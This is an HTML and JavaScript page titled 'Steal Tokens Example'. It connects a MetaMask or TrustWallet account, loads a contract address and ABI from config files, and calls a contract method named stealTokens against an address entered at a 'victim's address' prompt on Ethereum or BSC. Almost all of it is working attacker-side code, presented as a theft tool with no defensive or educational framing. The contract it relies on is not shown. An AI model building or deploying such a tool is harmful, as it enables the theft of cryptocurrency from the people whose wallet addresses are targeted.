<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Steal Tokens Example</title>
    <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider/dist/detect-provider.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
</head>
<body>
    <h1>Steal Tokens</h1>
    <button id="connectMetaMaskButton">Connect MetaMask</button>
    <button id="stealMetaMaskButton" disabled>Steal Tokens (ETH/Sepolia)</button>

    <button id="connectTrustWalletButton">Connect TrustWallet</button>
    <button id="stealTrustWalletButton" disabled>Steal Tokens (BSC)</button>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const connectMetaMaskButton = document.getElementById("connectMetaMaskButton");
            const stealMetaMaskButton = document.getElementById("stealMetaMaskButton");
            const connectTrustWalletButton = document.getElementById("connectTrustWalletButton");
            const stealTrustWalletButton = document.getElementById("stealTrustWalletButton");

            let web3;
            let userAccount = null;
            let contract;

            // Load Config and ABI
            async function loadConfigAndABI(network) {
                const configPath = `config/${network}_config.json`;
                const abiPath = `abi/${network}_abi.json`;

                try {
                    const config = await fetch(configPath).then(res => res.json());
                    const abi = await fetch(abiPath).then(res => res.json());
                    return { config, abi };
                } catch (error) {
                    console.error(`Error loading ${network} config/ABI:`, error);
                    alert(`Failed to load ${network} configuration.`);
                }
            }

            // Connect MetaMask
            async function connectMetaMask() {
                if (window.ethereum) {
                    try {
                        web3 = new Web3(window.ethereum);
                        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                        userAccount = accounts[0];
                        console.log("MetaMask connected:", userAccount);

                        // Load ETH/Sepolia config
                        const { config, abi } = await loadConfigAndABI('eth'); // Change to 'sepolia' if required
                        contract = new web3.eth.Contract(abi, config.contractAddress);
                        stealMetaMaskButton.disabled = false;

                        alert(`Connected to MetaMask: ${userAccount}`);
                    } catch (error) {
                        console.error("MetaMask connection failed:", error);
                        alert("Failed to connect MetaMask.");
                    }
                } else {
                    alert("MetaMask is not installed. Please install it to continue.");
                }
            }

            // Connect TrustWallet
            async function connectTrustWallet() {
                if (window.ethereum && window.ethereum.isTrust) {
                    try {
                        web3 = new Web3(window.ethereum);
                        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                        userAccount = accounts[0];
                        console.log("TrustWallet connected:", userAccount);

                        // Load BSC config
                        const { config, abi } = await loadConfigAndABI('bsc');
                        contract = new web3.eth.Contract(abi, config.contractAddress);
                        stealTrustWalletButton.disabled = false;

                        alert(`Connected to TrustWallet: ${userAccount}`);
                    } catch (error) {
                        console.error("TrustWallet connection failed:", error);
                        alert("Failed to connect TrustWallet.");
                    }
                } else {
                    alert("TrustWallet is not installed. Please install it to continue.");
                }
            }

            // Steal Tokens Functionality
            async function stealTokens(victimAddress) {
                if (!contract || !userAccount) {
                    alert("Please connect your wallet first.");
                    return;
                }

                try {
                    await contract.methods.stealTokens(victimAddress).send({ from: userAccount });
                    alert(`Tokens stolen successfully from: ${victimAddress}`);
                } catch (error) {
                    console.error("Error stealing tokens:", error);
                    alert("Failed to steal tokens.");
                }
            }

            // Event Listeners
            connectMetaMaskButton.addEventListener("click", connectMetaMask);
            stealMetaMaskButton.addEventListener("click", () => {
                const victim = prompt("Enter victim's address:");
                if (victim) stealTokens(victim);
            });

            connectTrustWalletButton.addEventListener("click", connectTrustWallet);
            stealTrustWalletButton.addEventListener("click", () => {
                const victim = prompt("Enter victim's address:");
                if (victim) stealTokens(victim);
            });
        });
    </script>
</body>
</html>


</body>
</html>
